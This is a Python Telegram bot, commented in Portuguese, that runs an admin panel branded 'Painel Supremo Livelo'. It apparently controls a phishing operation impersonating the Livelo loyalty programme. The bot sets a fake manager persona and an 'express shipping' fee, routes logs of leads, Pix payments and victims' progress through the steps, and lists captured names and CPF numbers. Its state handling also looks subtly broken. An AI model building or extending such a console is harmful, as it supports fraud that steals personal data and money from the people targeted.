import telebot
from telebot.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton, MenuButtonWebApp
import requests
import sqlite3
import os
import json

# ==========================================
# CONFIGURACOES DO BOT
# ==========================================
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "SEU_TOKEN_AQUI")
ADMIN_CHAT_ID  = os.environ.get("ADMIN_CHAT_ID", "SEU_ID_AQUI")
BOT_SECRET     = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
BASE_URL       = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5050")
WEBAPP_URL     = f"{BASE_URL}/tg_webapp"
API_BASE       = BASE_URL

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

def is_supreme(message):
    return str(message.chat.id) == str(ADMIN_CHAT_ID)

def api_call(action, payload=None):
    try:
        r = requests.post(
            f"{API_BASE}/api/internal/bot-gateway",
            json={"action": action, "payload": payload or {}},
            headers={"X-Bot-Secret": BOT_SECRET},
            timeout=10
        )
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

user_states = {}

# --- MENU INICIAL ---
@bot.message_handler(commands=["start", "menu", "painel"])
def send_welcome(message):
    if not is_supreme(message):
        bot.send_message(message.chat.id, "Acesso negado.")
        return
        
    bot.set_chat_menu_button(
        message.chat.id,
        MenuButtonWebApp(type="web_app", text="Painel Web", web_app=WebAppInfo(url=WEBAPP_URL))
    )
    
    show_main_menu(message.chat.id)

def show_main_menu(chat_id, message_id=None):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ Config Gerais", callback_data="menu_config"),
        InlineKeyboardButton("📢 Canais de Logs", callback_data="menu_logs")
    )
    markup.add(
        InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads"),
        InlineKeyboardButton("💰 Pagamentos", callback_data="menu_pagamentos")
    )
    markup.add(
        InlineKeyboardButton("🌐 Abrir Painel Web", web_app=WebAppInfo(url=WEBAPP_URL))
    )
    
    text = "👑 <b>Painel Supremo Livelo</b>\n\nBem-vindo ao centro de comando. Escolha uma opção abaixo:"
    
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    data = call.data
    
    if not str(chat_id) == str(ADMIN_CHAT_ID):
        bot.answer_callback_query(call.id, "Acesso negado.")
        return

    if data == "menu_main":
        user_states.pop(chat_id, None)
        show_main_menu(chat_id, msg_id)
        
    elif data == "menu_config":
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"👩‍💼 Nome da Gerente: {cfg.get('mgr_name', 'Não def.')}", callback_data="set_mgr_name"),
            InlineKeyboardButton(f"📅 Anos de Empresa: {cfg.get('mgr_years', 'Não def.')}", callback_data="set_mgr_years"),
            InlineKeyboardButton(f"🚚 Valor Frete Expresso: R$ {cfg.get('frete_expresso', '24,90')}", callback_data="set_frete_expresso"),
            InlineKeyboardButton(f"🖼️ Alterar Logo/Avatar", callback_data="set_avatar"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("⚙️ <b>Configurações Gerais</b>\nSelecione o que deseja alterar:", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_logs":
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"📝 Canal Leads: {cfg.get('tg_log_leads', 'Não def.')}", callback_data="set_log_leads"),
            InlineKeyboardButton(f"💸 Canal Pix/Pags: {cfg.get('tg_log_pagamentos', 'Não def.')}", callback_data="set_log_pagamentos"),
            InlineKeyboardButton(f"🚪 Canal Acessos/Etapas: {cfg.get('tg_log_acessos', 'Não def.')}", callback_data="set_log_acessos"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("📢 <b>Configurar Canais de Log</b>\nInsira o ID do grupo/canal para cada evento:", chat_id, msg_id, reply_markup=markup)

    elif data.startswith("set_"):
        key_map = {
            "set_mgr_name": ("mgr_name", "Digite o novo Nome da Gerente:"),
            "set_mgr_years": ("mgr_years", "Digite a nova quantidade de Anos na Empresa:"),
            "set_frete_expresso": ("frete_expresso", "Digite o valor do frete (ex: 24,90):"),
            "set_avatar": ("mgr_avatar", "Envie o LINK da nova logo/avatar (http...):"),
            "set_log_leads": ("tg_log_leads", "Digite o ID do canal para Logs de Leads Finalizados (-100...):"),
            "set_log_pagamentos": ("tg_log_pagamentos", "Digite o ID do canal para Logs de Pagamentos (-100...):"),
            "set_log_acessos": ("tg_log_acessos", "Digite o ID do canal para Logs de Acessos e Etapas (-100...):")
        }
        if data in key_map:
            db_key, prompt = key_map[data]
            user_states[chat_id] = {"action": "wait_input", "key": db_key, "msg_id": msg_id}
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config" if "log" not in data else "menu_logs"))
            bot.edit_message_text(f"✏️ {prompt}", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_leads":
        res = api_call("get_leads", {"limit": 5})
        if res.get("ok"):
            leads = res.get("leads", [])
            txt = "👥 <b>Últimos 5 Leads:</b>\n\n"
            for L in leads:
                txt += f"👤 <b>{L.get('nome', 'Sem nome')}</b>\nCPF: <code>{L.get('cpf', '-')}</code>\nCartão: {L.get('card_style', '-')}\nStatus: {L.get('pix_status', '-')}\n\n"
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if leads else "Nenhum lead ainda.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar leads.")

    elif data == "menu_pagamentos":
        res = api_call("get_payments", {"limit": 5})
        if res.get("ok"):
            pags = res.get("payments", [])
            txt = "💰 <b>Últimos 5 Pagamentos (Tentativas):</b>\n\n"
            for P in pags:
                txt += f"💸 R$ {P.get('amount', 0)}\nStatus: {P.get('status', '-')}\nID: <code>{P.get('payment_id', '-')}</code>\n\n"
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if pags else "Nenhum pagamento ainda.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar pagamentos.")

    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_input")
def handle_input(message):
    chat_id = str(message.chat.id)
    state = user_states[chat_id]
    db_key = state["key"]
    val = message.text.strip()
    
    bot.delete_message(chat_id, message.message_id)
    
    res = api_call("set_config", {db_key: val})
    if res.get("ok"):
        bot.edit_message_text("✅ Configuração salva com sucesso!", chat_id, state["msg_id"])
    else:
        bot.edit_message_text(f"❌ Erro ao salvar: {res.get('error')}", chat_id, state["msg_id"])
        
    del user_states[chat_id]
    show_main_menu(chat_id)

if __name__ == "__main__":
    print("Bot Telegram Admin 2.0 Iniciado!")
    bot.infinity_polling()
